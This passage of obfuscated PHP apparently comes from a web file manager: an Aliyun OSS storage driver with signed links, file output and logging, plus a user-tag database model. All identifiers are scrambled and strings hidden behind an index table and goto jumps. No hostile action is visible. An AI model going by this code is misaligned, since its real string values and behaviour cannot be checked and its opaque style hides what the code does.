$_SERVER[Ùæõ‰Ï’][214] . $Â—ûã™ü->getMessage()); think_exception($Â—ûã™ü->getMessage()); return !1; } } private function trafficLimit($µ´ú™ıˆ, $ä®à¯ìæ = array()) { $ÛÏ½˜ˆ =& $_SERVER[Ùæõ‰Ï’]; if ($µ´ú™ıˆ == $ÛÏ½˜ˆ[1497] && $this->isUploadServer() || $µ´ú™ıˆ == $ÛÏ½˜ˆ[112] && $this->isFileOutServer()) { return $ä®à¯ìæ; } $–áæ÷úâ = floatval($GLOBALS[$ÛÏ½˜ˆ[6]][$ÛÏ½˜ˆ[92]][$ÛÏ½˜ˆ[110]][$µ´ú™ıˆ]) * 1024 * 1024 * 8; if (!$–áæ÷úâ) { return $ä®à¯ìæ; } $–áæ÷úâ = $–áæ÷úâ < 819200 ? 819200 : ($–áæ÷úâ > 838860800 ? 838860800 : $–áæ÷úâ); $ä®à¯ìæ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($–áæ÷úâ); return $ä®à¯ìæ; } public function link($Åı¯Ù†, $ê´ç²Å = array()) { $ı³öé‹µ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->exist($Åı¯Ù†) || $this->isFolder($Åı¯Ù†)) { return !1; } try { $ê´ç²Å = $this->trafficLimit($ı³öé‹µ[112], $ê´ç²Å); $ó‡›”äÄ = $this->client->signUrl($this->bucket, $this->pathEncode($Åı¯Ù†), 3600 * 12, $ı³öé‹µ[261], $ê´ç²Å); return $this->getCdnLink($ó‡›”äÄ); } catch (OSS\Core\OssException $™‹’›Ï„) { $this->writeLog(__FUNCTION__ . $ı³öé‹µ[214] . $™‹’›Ï„->getMessage()); return !1; } } public function fileOut($ÉÅı«¨¨, $ãš³‰—õ = false, $½Í£¹˜ = false, $€Ã„Ù™É = '') { $³·èÍº =& $_SERVER[Ùæõ‰Ï’]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÉÅı«¨¨, $ãš³‰—õ, $½Í£¹˜, $€Ã„Ù™É); } if (!$½Í£¹˜) { $½Í£¹˜ = $this->pathThis($ÉÅı«¨¨); } $½Í£¹˜ = rawurlencode($½Í£¹˜); $ø„›äŞ = get_file_mime(get_path_ext($½Í£¹˜)); if ($ø„›äŞ == $³·èÍº[248]) { return parent::fileOut($ÉÅı«¨¨, $ãš³‰—õ, $½Í£¹˜, $€Ã„Ù™É); } $ãš³‰—õ = $ãš³‰—õ ? $³·èÍº[1507] : $³·èÍº[1508]; $ì£ªş° = array(OSS\OssClient::OSS_SUB_RESOURCE => $³·èÍº[1509] . rawurlencode("{$ãš³‰—õ}\x3b\x66\151\154\145\156\141\x6d\x65\x3d{$½Í£¹˜}")); $ì£ªş°[OSS\OssClient::OSS_SUB_RESOURCE] .= $³·èÍº[1510] . rawurlencode($ø„›äŞ); $¦¢ã¢×÷ = $this->link($ÉÅı«¨¨, $ì£ªş°); $this->fileOutLink($¦¢ã¢×÷); } public function fileOutServer($—áŠŒ©¤, $È†Ï¹šÍ = false, $äô•íû = false, $„ò€ÂÀ = '') { parent::fileOut($—áŠŒ©¤, $È†Ï¹šÍ, $äô•íû, $„ò€ÂÀ); } public function fileOutImage($óˆÄÈÇÂ, $¤Ô¾’ç¹ = 250) { if ($this->size($óˆÄÈÇÂ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($óˆÄÈÇÂ, $¤Ô¾’ç¹); } $¿ÃÍÔ°™ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ùæõ‰Ï’][1471] . $¤Ô¾’ç¹); $€ääÌˆé = $this->link($óˆÄÈÇÂ, $¿ÃÍÔ°™); $this->fileOutLink($€ääÌˆé); } public function fileOutImageServer($­ˆ«ÑÃá, $‡ŒÄ˜… = 250) { parent::fileOutImage($­ˆ«ÑÃá, $‡ŒÄ˜…); } public function fileOutLink($ûÑº§¦û) { $îÏığİÄ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->isCdnHost() && substr($ûÑº§¦û, 0, 7) == $îÏığİÄ[313]) { $ûÑº§¦û = $îÏığİÄ[314] . substr($ûÑº§¦û, 7); } header($îÏığİÄ[175] . $ûÑº§¦û); die; } public function hashMd5($³ÛòÁ­Ü, $öÏ»šîĞ = '') { $ÖĞ˜–¯Ó =& $_SERVER[Ùæõ‰Ï’]; $áÂğÊ = $this->_objectMeta($³ÛòÁ­Ü); if (!$áÂğÊ) { return $ÖĞ˜–¯Ó[12]; } if (!isset($áÂğÊ[$ÖĞ˜–¯Ó[1491]]) && !empty($öÏ»šîĞ)) { $îä‘Ö²ª = $this->updateObjMeta($³ÛòÁ­Ü, array($ÖĞ˜–¯Ó[1491] => $öÏ»šîĞ)); $áÂğÊ[$ÖĞ˜–¯Ó[1491]] = $îä‘Ö²ª ? $öÏ»šîĞ : $ÖĞ˜–¯Ó[12]; } return isset($áÂğÊ[$ÖĞ˜–¯Ó[1491]]) ? strtolower($áÂğÊ[$ÖĞ˜–¯Ó[1491]]) : $ÖĞ˜–¯Ó[12]; } public function size($¢ü·è¨õ) { $ÕéØ«¡ö = $this->objectMeta($¢ü·è¨õ); return $ÕéØ«¡ö ? $ÕéØ«¡ö[$_SERVER[Ùæõ‰Ï’][79]] : 0; } public function info($Éß’§ö) { if ($this->isFolder($Éß’§ö)) { return $this->folderInfo($Éß’§ö); } else { if ($this->isFile($Éß’§ö)) { return $this->fileInfo($Éß’§ö); } } return !1; } public function exist($Ûƒş¶ßÛ) { return $this->isFile($Ûƒş¶ßÛ) || $this->isFolder($Ûƒş¶ßÛ); } public function isFile($Æƒ–ï”á) { return !$this->isFolder($Æƒ–ï”á) && $this->objectMeta($Æƒ–ï”á); } public function isFolder($¨»¥Æµ¼) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][179], $¨»¥Æµ¼); } protected function objectMeta($œÎ„öì«) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][181], $œÎ„öì«); } protected function _objectMeta($Å“²‡œÁ) { $—£Ô„£Ë =& $_SERVER[Ùæõ‰Ï’]; try { $¶¬ê©à™ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Å“²‡œÁ)); } catch (OSS\Core\OssException $ÄŞ÷í) { $this->writeLog(__FUNCTION__ . $—£Ô„£Ë[214] . $ÄŞ÷í->getMessage()); $¶¬ê©à™ = !1; } if ($¶¬ê©à™) { $¶¬ê©à™[$—£Ô„£Ë[79]] = intval($¶¬ê©à™[$—£Ô„£Ë[1489]]); } return $¶¬ê©à™; } protected function _isFolder($‰÷ï×Ğ) { $áæõ¸â› =& $_SERVER[Ùæõ‰Ï’]; if ($‰÷ï×Ğ == $áæõ¸â›[12] || $‰÷ï×Ğ == $áæõ¸â›[8]) { return !0; } $èÒ½‡¶Ã = array($áæõ¸â›[1484] => $áæõ¸â›[8], $áæõ¸â›[1485] => rtrim($‰÷ï×Ğ, $áæõ¸â›[8]) . $áæõ¸â›[8], $áæõ¸â›[1486] => 1, $áæõ¸â›[1487] => $áæõ¸â›[12]); $ÂÖÜë÷Ñ = $this->client->listObjects($this->bucket, $èÒ½‡¶Ã); if ($ÂÖÜë÷Ñ->getObjectList() || $ÂÖÜë÷Ñ->getPrefixList()) { return !0; } return !1; } public function writeLog($¸üÊ÷¬ = '', $Æ˜šöò… = false) { $…Æ¾¦¥ =& $_SERVER[Ùæõ‰Ï’]; $êäœßÜñ = in_array(ACTION, array($…Æ¾¦¥[212], $…Æ¾¦¥[213])); if (!$êäœßÜñ && !GLOBAL_DEBUG) { return; } $ø‘ŸËßî = 0; if (stripos($¸üÊ÷¬, $…Æ¾¦¥[1511]) !== !1) { $ø‘ŸËßî = 1; $ÄáÛ­çõ = explode($…Æ¾¦¥[1512], $¸üÊ÷¬); $¸üÊ÷¬ = !empty($ÄáÛ­çõ[1]) ? $ÄáÛ­çõ[1] : $¸üÊ÷¬; } else { if (stripos($¸üÊ÷¬, $…Æ¾¦¥[1513])) { $ø‘ŸËßî = 2; $ÄáÛ­çõ = explode($…Æ¾¦¥[1513], $¸üÊ÷¬); $ÄáÛ­çõ = explode($…Æ¾¦¥[4], $ÄáÛ­çõ[0]); $¸üÊ÷¬ = !empty($ÄáÛ­çõ[1]) ? $ÄáÛ­çõ[1] : $¸üÊ÷¬; } } if ($êäœßÜñ && I18n::getType() == $…Æ¾¦¥[1514]) { if ($ø‘ŸËßî == 1) { $¸üÊ÷¬ = str_replace($…Æ¾¦¥[1515], $…Æ¾¦¥[1516], $¸üÊ÷¬); } else { if ($ø‘ŸËßî == 2) { $ÄáÛ­çõ = explode($…Æ¾¦¥[214], $ÄáÛ­çõ[0]); $­Äñ·¸ = isset($ÄáÛ­çõ[1]) ? $ÄáÛ­çõ[1] : $…Æ¾¦¥[12]; $ ÚÚÚ­“ = array($…Æ¾¦¥[1517] => $…Æ¾¦¥[1518], $…Æ¾¦¥[1519] => $…Æ¾¦¥[1520], $…Æ¾¦¥[1521] => $…Æ¾¦¥[1522], $…Æ¾¦¥[1523] => $…Æ¾¦¥[1524], $…Æ¾¦¥[1525] => $…Æ¾¦¥[1526], $…Æ¾¦¥[1527] => $…Æ¾¦¥[1528], $…Æ¾¦¥[1529] => $…Æ¾¦¥[1530], $…Æ¾¦¥[1531] => $…Æ¾¦¥[1532], $…Æ¾¦¥[1533] => $…Æ¾¦¥[1534], $…Æ¾¦¥[1535] => $…Æ¾¦¥[1536]); if (isset($ ÚÚÚ­“[$­Äñ·¸])) { $¸üÊ÷¬ = $ ÚÚÚ­“[$­Äñ·¸]; } } } if (stripos($¸üÊ÷¬, $…Æ¾¦¥[1537])) { $¸üÊ÷¬ = $…Æ¾¦¥[1538]; } } if (!trim($¸üÊ÷¬)) { return; } parent::writeLog(trim($¸üÊ÷¬), $Æ˜šöò…); } } goto B’ÔŠ®òÉ›; dëÈäÎÓÜ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\166"; protected function cacheFunctionAlias($¸ñ€ÉÓ) { $øÃÅâê =& $_SERVER[Ùæõ‰Ï’]; return array($øÃÅâê[2094] => array($øÃÅâê[2509] . USER_ID, $øÃÅâê[2095])); } protected function listData() { $  Â¥“ =& $_SERVER[Ùæõ‰Ï’]; $ÂÜµ‡³× = array($  Â¥“[1772] => USER_ID, $  Â¥“[557] => array($  Â¥“[2098], 0)); $‰µ›®İœ = $  Â¥“[2510]; $êÔßÖ´æ = $this->field($‰µ›®İœ)->where($ÂÜµ‡³×)->order($  Â¥“[2101])->select(); return $êÔßÖ´æ ? $êÔßÖ´æ : array(); } protected function addToTag($ÁÈâïÚç, $¶‘³Í‡) { $³ Á©šÔ =& $_SERVER[Ùæõ‰Ï’]; if (!Model($³ Á©šÔ[2245])->listData($¶‘³Í‡)) { return !1; } if (is_numeric($ÁÈâïÚç)) { $ƒ¹áó¼¦ = Model($³ Á©šÔ[907])->pathInfo($ÁÈâïÚç); if (!$ƒ¹áó¼¦) { return !1; } } else { $ƒ¹áó¼¦ = IO::infoSimple($ÁÈâïÚç); if (!$ƒ¹áó¼¦) { return !1; } $³ŒÑ ¤á = $ƒ¹áó¼¦[$³ Á©šÔ[32]]; $ê –…‘Ş = $ƒ¹áó¼¦[$³ Á©šÔ[33]]; if (isset($ƒ¹áó¼¦[$³ Á©šÔ[485]])) { $ê –…‘Ş = $ƒ¹áó¼¦[$³ Á©šÔ[485]] == $³ Á©šÔ[91] ? $³ Á©šÔ[78] : $³ Á©šÔ[230]; } } $úÆæ¶ß™ = array($³ Á©šÔ[1772] => USER_ID, $³ Á©šÔ[557] => $¶‘³Í‡, $³ Á©šÔ[495] => $ÁÈâïÚç, $³ Á©šÔ[496] => $ê –…‘Ş ? $ê –…‘Ş : $³ Á©šÔ[490], $³ Á©šÔ[494] => $³ŒÑ ¤á ? $³ŒÑ ¤á : $³ Á©šÔ[12], $³ Á©šÔ[1983] => 0); if ($this->where($úÆæ¶ß™)->find()) { return !1; } return $this->add($úÆæ¶ß™); } protected function removeFromTag($ö‹¤¬¶é, $ò»°ğÜ) { $±„’—ÖŒ =& $_SERVER[Ùæõ‰Ï’]; if (!Model($±„’—ÖŒ[2245])->listData($ò»°ğÜ)) { return !1; } if (is_array($ö‹¤¬¶é)) { $ö‹¤¬¶é = array($±„’—ÖŒ[7], $ö‹¤¬¶é); } $÷šä›øı = array($±„’—ÖŒ[1772] => USER_ID, $±„’—ÖŒ[557] => $ò»°ğÜ, $±„’—ÖŒ[495] => $ö‹¤¬¶é); return $this->where($÷šä›øı)->delete(); } protected function removeByTag($Î‚û–ç) { $¾ıÎèË =& $_SERVER[Ùæõ‰Ï’]; if (!$Î‚û–ç) { return !1; } $°Ã‚³×ü = array($¾ıÎèË[1772] => USER_ID, $¾ıÎèË[557] => $Î‚û–ç); return $this->where($°Ã‚³×ü)->delete(); } protected function removeBySource($§”°åÖ) { $ÛâÅ…¯ =& $_SERVER[Ùæõ‰Ï’]; if (is_array($§”°åÖ)) { $§”°åÖ = array($ÛâÅ…¯[7], $§”°åÖ); } $Æ³³ê¹æ = array($ÛâÅ…¯[1772] => USER_ID, $ÛâÅ…¯[557] => array($ÛâÅ…¯[1105], 0), $ÛâÅ…¯[495] => $§”°åÖ); return $this->where($Æ³³ê¹æ)->delete(); } }